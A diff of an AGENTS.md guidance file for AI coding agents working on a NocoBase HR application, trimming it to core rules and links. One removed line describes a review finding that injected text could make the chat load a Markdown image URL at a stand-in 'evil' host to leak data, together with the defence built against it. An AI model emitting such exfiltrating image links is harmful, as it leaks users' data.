@@ -1,38 +1,38 @@
 # Application Development Guidelines
 
+## NocoHR preservation and pending integration
+
+Read [.agents/rules/nocohr-retained.md](.agents/rules/nocohr-retained.md) for the application's business and shell customizations. It preserves the previous root guidance so that no application-specific requirement is lost. Its NocoHR requirements take precedence over generic template defaults below: retain the separate Settings and development surfaces, authorized header links, mobile employee tabs, NocoHR branding and landing redirects, AI greetings/tool labels, safe Markdown, CSP, login return paths, notifications, mail and all business behavior.
+
+The fixed `.76` template source is integrated, with Skills `.44`; the source marker now records `.76`. Final upgrade acceptance remains open because the organization-sync full-run shutdown failure is unclassified; see [the bounded attribution and marker record](server/providers/upgrade/template-marker-followup.md). Historical `.54` marker instructions in retained rules and unit records describe their earlier snapshots and are superseded by this source marker; preflight and disabled runtime gates remain unchanged. Native Agents now owns new employee chats, model configuration, settings proposals and ordinary structured generation; see [.agents/rules/native-ai.md](.agents/rules/native-ai.md). Retired AI/Workflow plugins, Hub and Refine remain removed. Native IM sessions and bound approval cards use the same official execution; production channels remain unactivated. Knowledge, legacy history and the process runtime retain their separate integration gates and disabled source defaults. Preserve historical migration sources and data; new-database validation does not validate an installed deployment's migration. See [the integration record](server/providers/upgrade/template-integration.md) for evidence and remaining work.
+
 This is a NocoBase 3 application. Do not apply globally installed NocoBase 2 Skills. You are building the application itself — its pages, its API, its database tables. Everything under this directory is application-owned source code that you may edit directly.
 
 Do not create a plugin to add a feature. Plugins are separately published packages for capabilities shared across several applications; building one for this application's own feature adds a package boundary, a version, and a release process to work that belongs in `client/` and `server/`. Create one only when the user explicitly asks for a reusable published package.
 
 ## Default template scope
 
-Default is the clean application starting point. It registers product capabilities but no `app-plugin-*-example` plugins, example pages, application sample services, or sample APIs. Keep runnable demonstrations in `app-template-examples`. Application-owned server routes start empty; the only built-in application provider exposes Authorization Permission Sets as direct roles in the Users page. The only application page is a localized homepage.
+Default is the clean application starting point. It registers product capabilities but no `app-plugin-*-example` plugins, example pages, application sample services, or sample APIs. Keep runnable demonstrations in `app-template-examples`. Application-owned business server routes start empty; Users supplies the standard Permission Set role scope. Application-owned pages include the localized homepage and inbox; prepared user/role administration modules are unregistered in the bare template and enabled as business capabilities are developed.
 
 `database/main/` contains required permission initialization only; application-owned business migrations and seeds start empty. Do not add article history, demo seeds, or compatibility copies from Examples to this template. Existing installations retain their own executed migration sources when upgrading; see the [upgrade migration rules](.agents/skills/nocobase-app-upgrade/references/edge-cases.md#migrations).
+
+## Keeping this file small
+
+This file stays at most 32 KB and must not grow without bound, because every agent loads it on every start. It holds only the rules that apply everywhere and an index of where the detail lives.
+
+- Application-specific guidance — including what a change to this application's structure, shell or conventions needs the next agent to know — goes in `.agents/rules/<topic>.md`. Update the relevant file, or add one, and add or update its entry in the [index](#index) below rather than writing the detail here.
+- Framework-wide guidance lives in the synchronized Skills under `.agents/skills/`. Link to it, never copy it here; when it is wrong for every application, correct it upstream in `@nocobase/app-skills`.
+- `tests/logic/agents-md.test.ts` enforces the size limit and checks that the links here and in `.agents/rules/` resolve.
 
 ## Load the development skills
 
 `pnpm install` runs `pnpm nocobase skills sync` through the application's `postinstall` hook. If `.agents/skills/nocobase-app-development/` is missing, install dependencies from the application root; if install scripts were disabled or synchronized Skills are stale, run `pnpm nocobase skills sync` explicitly.
 
-`.agents/skills/nocobase-app-development/` holds the detailed guidance behind this file. Read its `SKILL.md` first — it routes to the reference that matches your task instead of making you read everything:
+[`.agents/skills/nocobase-app-development/SKILL.md`](.agents/skills/nocobase-app-development/SKILL.md) holds the detailed guidance behind this file. Read it first — it routes to the reference that matches your task. Read the one page your task needs, not the whole directory.
 
-| Task                                                         | Reference                            |
-| ------------------------------------------------------------ | ------------------------------------ |
-| Any frontend change: pages, routes, components, styles, copy | `references/frontend/ui-workflow.md` |
-| Add an HTTP endpoint                                         | `references/server-routes.md`        |
-| Name an endpoint, shape its response or errors, validate it  | `references/http-api.md`             |
-| Read or write data                                           | `references/database-and-data.md`    |
-| Change the schema                                            | `references/migrations.md`           |
-| Switch or add a database connection                          | `references/database-connections.md` |
-| Translate server-produced text or add a language             | `references/i18n.md`                 |
-| Add a service, background job, or scheduled task             | `references/services-and-jobs.md`    |
-| Write tests and verify                                       | `references/testing.md`              |
+`.agents/skills/nocobase-app-upgrade/` is a separate Skill for a separate job: merging a newer release of the template this application was generated from. Read it when the task is upgrading the template rather than building a feature — including when the user asks to upgrade NocoBase or its core version, because a newer template release is how this application moves to a newer NocoBase — and read it before touching anything — an upgrade done by copying the newest template over this application destroys the work that made it this application.
 
-Read the one page your task needs, not the whole directory.
-
-`.agents/skills/nocobase-app-upgrade/` is a separate Skill for a separate job: merging a newer release of the template this application was generated from. Read it when the task is upgrading the template rather than building a feature, and read it before touching anything — an upgrade done by copying the newest template over this application destroys the work that made it this application.
-
-`.agents/skills/nocobase-deployment/` covers moving this application from source to a production server or a Hub: building for the target platform, what the archive does and does not carry, migrations and business data, production configuration, workflow artifacts after a production build, and what to verify afterwards. Read it before building for deployment, and when an application starts in production but does not work.
+`.agents/skills/nocobase-deployment/` covers moving this application from source to a production server: building for the target platform, what the archive does and does not carry, migrations and business data, production configuration, and what to verify afterwards. Read it before building for deployment, and when an application starts in production but does not work.
 
 ## Where things go
 
@@ -44,7 +44,7 @@ client/pages/             The page component; a folder when a page has children 
 client/components/        Your components
 client/components/ui/     shadcn/ui primitives; add with the CLI, never hand-write or edit
 client/hooks/             Hooks shared across features
-client/locales/           Every user-visible string
+client/locales/           Every user-visible string; system/ holds the template's copy
 client/service-provider.ts Client startup: services that boot with the application
 server/routes/            HTTP endpoints
 server/providers/         Services and their lifecycle
@@ -55,457 +55,79 @@ cli/commands/             Commands this application owns
 tests/                    Tests; never beside the source
 ```
 
-A page with children or page-local helpers uses a folder with `index.tsx`; child folders mirror route paths. Keep page-local components and data in that folder, reserving `client/components/` for application-wide components. See [child routes](.agents/skills/nocobase-app-development/references/frontend/references/child-routes.md) for examples.
+A feature with a page and an API touches five places: a migration for the table, a route in `server/routes/`, a page in `client/pages/` declared in `client/routes.ts`, navigation on the page route, and strings in `client/locales/`. A page with children or page-local helpers uses a folder with `index.tsx`; child folders mirror route paths. [Application structure](.agents/skills/nocobase-app-development/references/app-structure.md) explains how the runtime composes these pieces, where configuration and its environment variables are declared, and the runtime paths.
 
-A feature with a page and an API touches five places: a migration for the table, a route in `server/routes/`, a page in `client/pages/` declared in `client/routes.ts`, navigation on the page route, and strings in `client/locales/`.
+## System settings are part of feature delivery
 
-`client/runtime.ts` composes the browser application; `client/react-providers.ts` declares React providers in outer-to-inner layers `root`, `application`, and `extension`. Applications use the first two and plugins own the last; `before` and `after` order providers only within their layer.
+A bare create-app stays Home-only with no settings routes or menu. As the application develops business capabilities, inspect its current state on every iteration and automatically register the prepared Users and Roles and permissions contribution from `client/pages/settings/routes.ts` once in `client/routes.ts`; preserve it and reconcile missing management surfaces on every iteration, without a first-build flag or one-time setup stage. Whenever an application adds lifecycles, workflows, approvals, notifications, files or other configurable capabilities, automatically include their real administration surfaces without requiring a second user request. Follow [system settings delivery](.agents/skills/nocobase-app-development/references/system-settings.md); in particular, every used process includes a definitions directory, standard diagram, supported parameters and authorized execution history. Do not add demo plugins or empty settings for unused capabilities. The template preinstalls `#components/lifecycle-diagram` (React Flow + ELK) and `client/extensions/nocobase-workflow-management/`: use them by default, preserve their visuals unless the user explicitly requests another style, and connect authorized parameter bindings through `LifecycleDiagram.configuration` to the real editor. These are UI Registry sources; an npm package lookup is not a component availability check.
 
-`server/runtime.ts` composes configuration, plugins, providers and routes; `server/app.ts` assembles the application. `server/standalone.ts` starts the Node listener and `server/embedded.ts` lets a host mount the same runtime. Register endpoints through `server/routes/index.ts`; queue consumers and background jobs are registered from a service provider, not discovered from a directory. Editable module defaults live in `server/config/` and are collected by `defaultAppConfigs` in its `index.ts`; `server/config.ts` loads the configuration file. Each section declares the environment variables that set it in `env` of its `defineAppConfig`; `pnpm nocobase config env` lists them all.
+## Rules that apply everywhere
 
-### The rest is framework structure
+### Pages and routes
 
-Layouts own breadcrumb route context; `AppRouter` selects routes and layouts. See [pages and routes](.agents/skills/nocobase-app-development/references/frontend/references/page.md) for each layout's scope.
+Declare every page in `client/routes.ts` with `defineAppRoutes()` and keep its component behind a lazy `componentLoader` whose module default-exports it. Never write the deployment base path such as `/main` into a route — the runtime restores it. `auth` controls browser navigation only and is not server security. Declare `navigation` on the route to put it in a menu, and always declare `authz` on the first page of every path; the page id identifies stored page grants, so changing it requires migrating the grants that reference it. Read [pages and routes](.agents/skills/nocobase-app-development/references/frontend/references/page.md), and [overlays](.agents/skills/nocobase-app-development/references/frontend/references/overlay.md) before implementing dialogs, drawers or close guards.
 
-`client/layouts/components/layout-header.tsx` is a presentation container accepting children. The sidebar is shadcn's Sidebar: `components/app-sidebar.tsx` wraps its provider, desktop icon mode and phone sheet, and `components/navigation-menu.tsx` draws the permission-filtered route tree with `SidebarMenu*` and controlled `Collapsible` sub-menus. Leave `client/components/ui/sidebar.tsx` as the shadcn CLI writes it and customize from outside: widths go through the provider's `style` in spacing units, the phone sheet is rendered in `app-sidebar.tsx` with a translated title, and the provider's Ctrl/Cmd+B shortcut is stopped at `document`. App, Settings and Dev layouts own menus, branding, permissions and redirects. Desktop icon mode shows leaf labels as zero-delay tooltips and opens groups in hover and keyboard-focus popovers, preserving filtered navigation, parent-page links, nested groups and the selected group's highlight. Keep this behavior aligned across layouts. Desktop collapse state is shared through `useSidebarPreference` at `nocobase:sidebar:collapsed` across applications on the same origin; whether the phone sheet is open stays local to each layout.
+Every route listed as a page permission needs a localized display name: use its existing navigation/breadcrumb title, or add its application route name to `client/pages/settings/page-permission-titles.ts` for an overlay or other page with no title metadata. Do not add breadcrumbs/menus just to label an overlay. Run `tests/logic/page-permission-titles.test.ts`; it requires non-empty English/Chinese labels and rejects missing or stale mappings. Never rename route/permission ids or change `authz` to fix display text.
 
-This application adds a phone-only employee tab bar (学习 · 考试 · 问答 · 自助 · 我的) to the App layout: `client/layouts/components/mobile-tab-bar.tsx`, rendered under `main` in `app-layout.tsx`. It reads the same authorized navigation items as the sidebar and lists routes by name (`talent-my-learning`, `talent-my-exams`, `talent-knowledge-qa`, `talent-self-service`, `talent-me`); keep it when reconciling the layout on upgrade, and update its list if those route names change.
+### Components and styling
 
-The shared `HeaderActions` (App, Settings and Dev layouts) also carries the V1-04 "AI 助手" button, `client/layouts/components/ai-assistant-button.tsx`: shown only to users who may `use` the composite `talent.aiAssistant`, it opens the unified AI entry (`client/components/talent/unified-assistant.tsx`, the same chat as the 问答 page) in a right-side Sheet, loading the AI chat code lazily. A route's `navigation` cannot place a header control, which is why the shell carries it; keep it when reconciling the header on upgrade.
+Import with the package-local `#components/...` and `#extensions/...` specifiers; never add a Vite alias or TypeScript `paths` mapping for them. Use shadcn/ui: check `client/components/ui/` first and add a missing primitive with `yes n | pnpm exec shadcn add <name>` rather than writing your own. Style only with the semantic Tailwind tokens, never hard-coded colors, and keep visual consistency application-wide: change the design tokens in `client/theme/themes/*.css` rather than restyling one page. This template's components, primitives and styling details are in [.agents/rules/components.md](.agents/rules/components.md).
 
-`HeaderActions` also carries the 通知 bell, `client/layouts/components/notifications-button.tsx`: every signed-in user sees the unread count of their in-app inbox and opens it at `/talent/inbox` (`client/pages/talent/inbox/`, route `talent-inbox`, `authz: 'skip'`, no menu entry), built from the in-app plugin's public `NotificationInAppInbox`. The plugin ships only a development page, so this is the production surface; keep both when reconciling the header on upgrade. Workbench to-dos from an AI employee carry a short `summary` and the full text in `workItems.detail`, which the card expands; obsolete to-dos are closed by the step that finishes them (`closeWorkItems` in `server/providers/hr/work-item-store.ts`).
+### Server routes and the API document
 
-`AIChatProvider` in `client/extensions/nocobase-ai/providers/chat-provider.tsx` takes an application-added `employeeGreetings` prop (a greeting per employee username for one chat): the 人事设置 “让人事助理起草” sheet greets administrators instead of showing the HR assistant's employee greeting. Keep it when updating the AI extension from the UI library.
+Every `/api` route follows [HTTP API design](.agents/skills/nocobase-app-development/references/http-api.md): camelCase paths, `{ data }` on success, `ApiError` on failure, input validated through `apiValidator()`, and a `describeRoute()` declaration; never write an error body by hand. **Every route owns its own security**: mounting under `/api` authenticates nothing, so install `auth.required()` and an explicit authorization check on the paths the route owns. Scope middleware to those paths, never `router.use('*', ...)`. A public webhook still verifies a signature, timestamp, or one-time state. Keep domain logic in a service under `server/providers/`. See [server routes](.agents/skills/nocobase-app-development/references/server-routes.md).
 
-The tool-call card in `client/extensions/nocobase-ai/components/chat/tool-call-card.tsx` shows a tool by its name in the application locale (`aiTools.<toolName>`, from `client/locales/modules/ai-tools.ts`) and only otherwise spells out the code name, which read “Draft Settings Change” in Chinese chats. Add a tool's name there when adding a tool, and keep the lookup when updating the AI extension.
+**Learn the available endpoints from the API document instead of reading route sources.** The running application serves it at `<APP_BASE_PATH>/api/swagger`, readable with a signed-in session or an `x-api-key` the user gives you; ask the user for a key rather than creating one, and fetch it again after registering a plugin or changing a Collection. See [the API document](.agents/skills/nocobase-app-development/references/http-api.md#api-documentation).
 
-Markdown a model or a document writes renders images only from the application's own origin (relative or same-origin URLs, and inline raster `data:` images); any other image is shown as a link, and links keep react-markdown's protocol allow-list. The rule is `client/extensions/nocobase-ai/shared/safe-markdown-urls.ts`, used by the chat's `markdown-message.tsx` and by `client/components/talent/markdown.tsx` (readiness review 2026-10-07: injected text could make the chat load `![](https://evil/?d=…)`). Keep it when updating the AI extension. Behind it, `server/app.ts` adds `contentSecurityPolicyMiddleware` (`server/http/content-security-policy.ts`), because the SPA module sends no Content-Security-Policy: HTML pages outside `/api/` get `img-src 'self' data: blob:`, `connect-src 'self'`, `frame-ancestors 'self'` and the rest of a same-origin baseline. It is off while `pnpm dev` serves the client through Vite (`spa.viteDevUrl`); a deployment that serves files from another origin adds it in the `contentSecurityPolicy` config section (`APP_CSP_IMG_SRC`, `APP_CSP_CONNECT_SRC`, `APP_CSP_FRAME_SRC`, `APP_CSP_ENABLED`). Keep the middleware when reconciling `server/app.ts` on upgrade.
+### Database
 
-The header brand `client/layouts/components/app-brand.tsx` shows the mark with the application's name as text (`app.title` in `client/locales/`, NocoHR) instead of the template's NocoBase wordmark image, as the sign-in pages do; keep it when reconciling the layout on upgrade. The browser tab title is `client.app.title` in each environment's `config.yml`.
+Schema changes are migrations under `database/main/migrations/`; required data is a seed under `database/main/seeds/`. **A migration is immutable history and must be self-contained**: spell out every field, index and constraint, never import an evolving definition, and write `down` as the explicit reverse. Edit an existing migration only while the branch that introduced it is unmerged; once merged, every correction is a new migration. The exported `name` must match the filename. Never edit `database/<connection>/collections/`; it is regenerated. Read [migrations and seeds](.agents/skills/nocobase-app-development/references/migrations.md), [database and data access](.agents/skills/nocobase-app-development/references/database-and-data.md) and [database connections](.agents/skills/nocobase-app-development/references/database-connections.md).
 
-The landing page `client/pages/home.tsx` forwards phones (< 768px) to 问答 (`/talent/ask`) and larger screens to the 工作台 (`/talent/workbench`) when the user may open them, then falls back to the first talent page in menu order (V1-04 “登录后的默认首页；员工在手机上默认进入问答”).
+### User-facing text
 
-The `demo-batch-record` route (`/demo/batch-record`, 设备开工登记 / Equipment start-up sign-off, work order MO-24031) and the `demo-forklift-dispatch` route (`/demo/forklift-dispatch`, 叉车出库登记, dispatch note CK-24031, `demo.forklift` resource, permission set `equip.forkliftOperator` on the 叉车证 certification) deliberately have no `navigation`: they demonstrate that a valid certificate grants a permission set (V4-14 industry pack, `server/providers/hr/licensed/`), and are the pages of the 制造业 industry content pack (`manufacturing`, below). The certification detail page and the holder's certificate wall link to them through the `path` the server returns (`grantedPageLinks`, `pageLinks`), taken from the enabled packs. Do not add them to the menu, and keep 演示 out of their titles, buttons and labels; both are the user's decisions. The route name, path, `demo.batch` resource and `demoBatchSignoffs` table of the first keep their original names from the pharma demo case; the table holds both kinds of start log (`kind` machineStart / forkliftDispatch). The industry pack's settings page is `/settings/licensed-operation` (hr.admin).
+Every string a user reads goes through a translation key. Write the application's copy in `client/locales/en-US.ts` and `zh-CN.ts`, never in `client/locales/system/`, which a template upgrade replaces; extend a shared group by spreading it first. To reword a plugin's string, add an `overrides` block keyed by that plugin's package name in your locale file; do not edit the plugin. See [frontend copy](.agents/skills/nocobase-app-development/references/frontend/references/i18n.md) and [internationalization](.agents/skills/nocobase-app-development/references/i18n.md).
 
-The App menu has three top-level groups, 人事, 招聘 (V2-07: 用工计划, 招聘需求, 职位, 候选人, 面试, Offer, 招聘报表; the `recruiting` group in `client/routes.ts`) and 人才发展 (the latter with 能力体系, 学习与培训, 考试与认证 and 绩效 (`performance-center`, V4-12) sub-groups, plus V3-11's six leaf pages: 待我决定, 团队看板, 找人, 业务数据, 修订建议, 审计导出, and V4-13's 人才盘点 and 继任计划; V4-13 adds 讲师, 培训评估 and 译文审核 under 学习与培训, 实操考核 under 考试与认证, and 设置 · 外部 AI 助手), following the 2026-09-28 总纲; the user chose this over the earlier function groups. The public careers pages (`/jobs`, `/jobs/:slug`, `/jobs/booking/:token`, `/jobs/ai-interview/:token`, `/offer/:token`) are `auth: 'optional'` routes with `authz: 'skip'`; their `/api/public/recruiting/*` endpoints enforce the careers-page switch, tokens and throttling themselves. The V3-11 customer audit pack share page `/audit-pack/:token` is the same kind of route: `/api/public/audit-pack/*` (`server/routes/hr/audit-requests.ts`) checks the hashed share token, its expiry and revocation, and a one-time code sent only to the requester's address before the pack downloads; the reply that carries the link is a mail draft whose link is created only when a person sends it (`prepareSend` in `server/providers/hr/mail/audit.ts`). In chat the certification steward reads the audit mailbox (`getMailMessage`: the unsorted messages, or one by id) and, once the user approves, creates a draft request from a message (`createAuditRequestFromMail`: departments and positions matched by name, unmatched names listed); both are in `server/ai/tools/profile-tools.ts` and call `auditMail`/`createFromMail` of the audit mail service. An audit request can also be created by hand on the 审核请求 tab (`POST /api/talent/audit-requests`, talent.auditRequest confirm); its scope is chosen afterwards, its risks follow the scope, and its reply is a new mail to the requester (`draftNew` in the mail service) instead of a reply. The demo data is the 启衡精密 case (01-演示案例.md).
+### The command line
 
-NocoHR is meant for every industry; the 启衡精密 manufacturing case is only its demo (docs/industry-generality-review.md). A new installation gets industry-neutral defaults: no certification-only permission sets, no glossary, synonyms or excluded performance categories, neutral check-in questions and practical-checklist keywords, no 借调 housing risk, and workforce plans counted in the neutral 单位 (招聘设置 · 业务量单位 `workforce.unitLabel`, shown with every planned, current and per-shift quantity and in the HR assistant's text). The demo writes its manufacturing values through gated demo seeds that fill only what is unset (202610210101, 202610210111, 202610210131, 202610210132, 202610220101 for the unit 件), and outside the demo seed 202610210102 removes the unassigned 设备开工登记 / 叉车出库登记 permission sets. Keep new defaults, AI prompt examples and fallback rules free of one industry's vocabulary; put such values in a demo seed or an industry content pack.
+`pnpm nocobase <topic> <command>` runs this application's CLI; only `pnpm dev`, `pnpm build`, `pnpm start` and the quality scripts are scripts. Read [the command line](.agents/skills/nocobase-app-development/references/cli.md) before running a command: `db reset`, `db rollback`, `db redo` and `db repair` refuse to run without `--force` outside a terminal, and that refusal is not something to work around. Commands this application owns live in `cli/commands/`; see [adding an application command](.agents/skills/nocobase-app-development/references/commands.md).
 
-Industry content packs (行业内容包, `server/providers/hr/industry-packs/`) carry the industry-specific content the 持证上岗 mechanism works on: each pack in `registry.ts` declares its operations (page id, client path, page title key, composite resource and action, operation kind, and the permission set with its definition). The only pack so far is 制造业 (`manufacturing.ts`: 设备开工登记 and 叉车出库登记). The choice is the personnelSettings row `industryPacks` (`{ enabled, history }`; missing means none on), switched on 设置 / 持证上岗 · 行业内容包 through `GET/PUT /api/talent/licensed/industry-packs[/:key]` (talent.licensedOperationSettings · manage). Turning a pack on creates its missing permission sets and never changes an existing one; turning it off deletes nothing, but its pages leave what certificates are said to allow, its endpoints answer `INDUSTRY_PACK_DISABLED` (the pages show an empty state), its kinds leave the start trace, the 持证操作追溯 export and the steward's trace tools (`packDisabled`). A new installation has no pack on; seed 202610230101 keeps 制造业 on where one of its sets is still assigned, and the demo seed 202610230102 turns it on when nothing was chosen. To add a pack: a definition in `registry.ts`, its server locale keys under `industryPacks.<key>`, its page route in `client/routes.ts` without navigation, its composite resource registered by the HR provider, and its endpoints calling `IndustryPackService.assertOperation(kind)` first. The start-log table is still `demoBatchSignoffs`; a generic certified-operation record is the next step (docs/industry-generality-review.md, section 7).
+### Dependencies
 
-Business mail (对账 / 招聘 / 审核 / 人事邮箱, `server/providers/hr/mail/`) runs on the Pro **Mail plugin** `@nocobase/app-plugin-mail` since 2026-10-05; read its Skill (`nocobase-app-plugin-mail`) before changing how mail is received or sent.
+Put a package your **server** code (`server/`, `database/`, `cli/`) imports in `dependencies`, and everything your **client** code imports — along with build tooling, tests, and type-only imports — in `devDependencies`. Keep `@nocobase/db` in `dependencies` alongside the database driver. Remove a direct `@nocobase/*` dependency only with `pnpm nocobase package remove` after reviewing its usage. See [where to declare a dependency](.agents/skills/nocobase-app-development/references/dependencies.md).
 
-- **Division of work.** The plugin owns accounts, credentials, synchronization and sending. NocoHR owns what mail means:
-  - purposes and their permissions;
-  - AI sorting;
-  - linking messages to records;
-  - drafts that a person confirms;
-  - reschedule proposals and audit share links.
-- **Mailboxes.** A purpose's mailbox is a plugin account, bound with its owner on 设置 / 邮件 (`businessMail.mailboxes[purpose].accountId/ownerUserId` in the `mail` personnelSettings row). It is read and sent as the owner through the plugin's `MailService`; the plugin's service has no permission checks of its own, so our routes check first. Only an account its owner offered on 我的邮箱 (允许作为业务邮箱, table `businessMailOffers`, migration 202610260011) is listed and may be newly bound; the owner is notified (`businessMailboxBound`) and cannot withdraw the offer while it is bound. Local accounts the service connects for a purpose are offered automatically, and gated demo seed 202610260012 offers the demo's already bound ones.
-- **Configuration.** There are two sections:
-  - `businessMail` (`server/config/business-mail.ts`): only each purpose's address.
-  - `mail` (`server/config/mail.ts`): the plugin's own section, with providers and OAuth.
+### Plugins
 
-  Ours was renamed from `mail` because the plugin owns that name.
+**Read a plugin's Skill before building what it already does.** Building a permission system, a notification sender, or a job scheduler by hand when a registered plugin already provides one is the most expensive mistake available here. Register and update plugins with `pnpm nocobase plugin register` and `pnpm nocobase plugin update`; customize a plugin's page through its options, a source extension or `client/route-overrides.ts`, never by redeclaring its route. `.agents/skills/` is generated output; never edit a file there. See [plugins](.agents/skills/nocobase-app-development/references/plugins.md).
 
-- **Development, tests and the demo** use a 本地文件邮箱 provider (`local-provider.ts`, type `local-files`, instance `local`). It is registered and configured only outside production, and refuses production. It reads `storage/mail/local/<address>/inbox/*.eml` and writes sent mail to `storage/mail/outbox/`. Each purpose's local account is connected the first time it is needed.
-- **Keeping.** Mail bodies and attachments are cleared daily (`sweepRetention`): unlinked mail after its mailbox's days; linked mail follows its record — the handler's `retentionOf` (the 招聘邮箱 keeps a candidate's mail for the candidate's 保存期限), else as long as the record exists. Anonymizing a candidate clears their mail at once (`forgetRecords`), and a resume mail keeps no body once the resume is with the candidate (`forgetMessage`). Subjects, addresses and links stay.
-- **Receiving.** The service synchronizes the account and waits for all its runs, then stores the new inbox messages once. Threads are found by the subject's `[#threadKey]` tag, or by In-Reply-To / References. There are no plus-addressed reply addresses any more.
-- **Table name.** The plugin creates its own `mailMessages`, so ours is `businessMailMessages`. 202610160001 and 202610180001 were edited to that name with the user's approval while the app was pre-release. On an older database, 202609020001 (named to sort before the plugin's 202609030001) copies the old table into the new one; then `pnpm nocobase db repair` realigns the two checksums.
-- **Version.** The plugin is pinned to 1.0.0-beta.6, the release matching `@nocobase/app-server` 1.0.0-beta.33 (template 1.0.0-beta.54), and listed in `minimumReleaseAgeExclude`. 1.0.0-beta.7 and later need `@nocobase/app-server` 2. Its components come from `@nocobase/app-plugin-mail/client/components`.
-- **Production pages.** The plugin's own pages are development-only, so we add:
-  - 我的邮箱 (`/talent/my-mailbox`, page `mail.workspace`, granted by seed 202610190102), where users connect their own mailbox;
-  - 我的邮箱往来 on the candidate detail page;
-  - the account picker on 设置 / 邮件.
+### Running the application
 
-  OAuth returns to `/talent/my-mailbox`.
+When reporting or opening this application's address, use the `Local:` URL printed by `pnpm dev`, including the application base path, and never infer it from defaults or Vite's port. See [the development server](.agents/skills/nocobase-app-development/references/dev-server.md) for restarts, file watching and developing against another backend.
 
-已离职员工的邮件往来 (V1-02 V2 增补, `server/providers/hr/departed/`) uses the 人事邮箱 (purpose `hr`):
+### Before you finish
 
-- `employees.personalEmail` is a sensitive field (hr.admin and the person), filled on the 离职单, by HR, or as a self-service change; the change checklist's `departedContact` item lists it.
-- Documents (离职证明, 工作经历证明, 收入证明, 工资条) are PDFs reached only through a 7-day link (`documentShares`, `/hr-document/:token`, `/api/public/hr-document/*`) that opens with a one-time code mailed to the registered personal address; mail text never carries amounts or ID numbers.
-- The separation certificate is mailed when a 离职单 takes effect (job-event handler `departed.offboard`), but only once an HR administrator has confirmed its template on 设置 / 邮件; the last payslip's link follows the payroll cycle's publication (`PayrollContext.onPublished`).
-- A request from the registered address is linked to the employee and drafted with a `proposal` naming the document; income certificates and payslips are sent by payroll only, the others by HR administrators. A request from any other address stays unsorted and its draft names no one.
-- Each mailbox purpose has its own composite permission (`server/providers/hr/mail/resources.ts`: `talent.mailBilling`, `talent.mailRecruiting`, `talent.mailAudit`, `talent.mailHr`, each with view, send and assign; granted by seed 202610200103). The page resource `talent.mail` only shows the menu entry; resort, ignore and transfer (转给其他用途: an unsorted message moves to another purpose, whose step sorts it again; assign on the source is enough) need assign. So does 挂到单据: a step lists the records its unsorted mail may be linked to (`linkTargets` / `linkTarget` on the handler: bills, the recruiter's own applications and published postings (`jobPosting`), audit requests, employees); after the link `onLinked` drafts the step's reply (a candidate's reply flow, or an answer from the posting), else a plain reply draft waits. In the 人事邮箱 those with assign (hr.admin) see all of it, payroll (view and send) only mail about pay (the handler's `canSee`, which the mail service applies to lists, threads and single messages). Mail the mailbox sends itself carries the document in `proposal` (`documentSent`, `documentCode`) for that check.
-- The 招聘邮箱 uses the same `canSee`: a recruiter sees mail linked to applications of the requisitions they are responsible for (`jobRequisitions.recruiterUserId`) and the mail not linked yet (待归类).
-- The resume receipt (招聘邮箱) is sent only from a template a recruiter confirmed once: `GET/PUT /api/talent/mail/recruiting/receipt-template`, stored in the personnelSettings row `recruitingReceipt`, edited from the 简历回执 sheet on 邮件往来 · 招聘邮箱 (`client/pages/talent/mail/receipt-template.tsx`). Until then resumes are taken in without a receipt and the recruiters are reminded; the demo seed 202610200101 confirms it as recruit01.
-- The receipt carries a deletion link (`{{deleteLink}}`, required in the template): `/jobs/deletion/:token` (public, `/api/public/recruiting/deletion/:token`) records `candidates.deletionRequestedAt` and notifies the recruiters responsible (`recruitingDeletionRequested`); the candidate detail shows the request to them, and anonymizing clears `candidates.deletionTokenHash`, so the link stops working.
-- A resume a job site forwards keeps `sourceChannel = email` and records the site in `sourceName` on the candidate and the application (`forwardingSite` in `server/providers/hr/mail/recruiting.ts`: 【…】 in the subject, else the sender's name, else its domain; none when the candidate writes in). The recruiting report still groups by `sourceChannel`.
-- A candidate's question by mail is answered from the posting only (V2-07: 询问时按职位信息起草回复): the recruiting assistant drafts it through `ai-runner`, falling back to `answerFromPosting` (location, requirements, duties); pay, housing, shuttles and the like are never promised — the draft says the recruiter will answer them and the summary tells the recruiter what to add. The employee knowledge base is not used for candidates.
+Scope all verification — formatting, lint, type checking, tests, builds and runtime checks — to the affected files, projects, or packages and their affected consumers. Do not run full-application or workspace-wide checks, or an aggregate `pnpm check`, as a routine step after each edit. Documentation-only changes need formatting and link checks for the changed documents, not type checking, runtime tests, or builds. Report which checks ran, their scope, and any unverified behavior.
 
-A real Feishu tenant is reached through a self-built app configured in the `feishu` config section (`server/config/feishu.ts`; `FEISHU_APP_ID` / `FEISHU_APP_SECRET`, set in `.env.local` or the deployment's secrets, never committed). No office-suite plugin is installed, so `server/providers/hr/feishu/` holds the client (`api.ts`), the bot transport (`transport.ts`: text and cards by `user_id`, cards updated in place through `imCards.externalMessageId`) and the long connection (`long-connection.ts`: `im.message.receive_v1` and `card.action.trigger`, so no public callback URL is needed); `org-sync/feishu-source.ts` reads the directory. With both credentials set, the directory sync, the bot channel and the long connection use the tenant instead of the development mock (`storage/org-sync/feishu-mock.json`, `/dev/im-mock`); leave them unset (commented out) for the demo walkthrough, which relies on the mock's members. Switching between the two needs the other side's `externalId` / `externalUserId` bindings cleared first. Back to the mock, after commenting the credentials out, `POST /api/talent/org-sync/dev/use-mock` (development only, `talent.orgSync · run`, in `server/routes/hr/org-sync.ts`) clears the Feishu bindings and runs a full sync against the mock; it refuses while the credentials are still set. The 持证上岗 settings page names the certifications that grant each permission set, because the authorization plugin's 权限检查器 shows only the set. Nothing Feishu-related runs under Vitest. Links in Feishu messages use `feishu.linkOrigin`, else `app.publicOrigin`, else `http://localhost:<server.port>` outside production.
+Add tests for what you changed — a route's authenticated, unauthenticated, and unauthorized responses; a migration's `up` and `down` against a real database; a page's actual behavior — in `tests/`, never beside the source; browser tests go in `tests/playwright/`. See [testing and verification](.agents/skills/nocobase-app-development/references/testing.md).
 
-The change checklist's 排班 item is the `schedule` provider in `server/providers/hr/schedule-checklist.ts` (scope before a transfer takes effect, the revalidation result after; offboarding: shifts after the leaving day and unused annual leave); the rules themselves stay in the `attendance.transferRevalidate` and `attendance.offboard` job-event handlers.
+For any UI work, start with [the frontend workflow](.agents/skills/nocobase-app-development/references/frontend/ui-workflow.md), which decides the workflow and routes to the styling rules, the theme token contract and the rest.
 
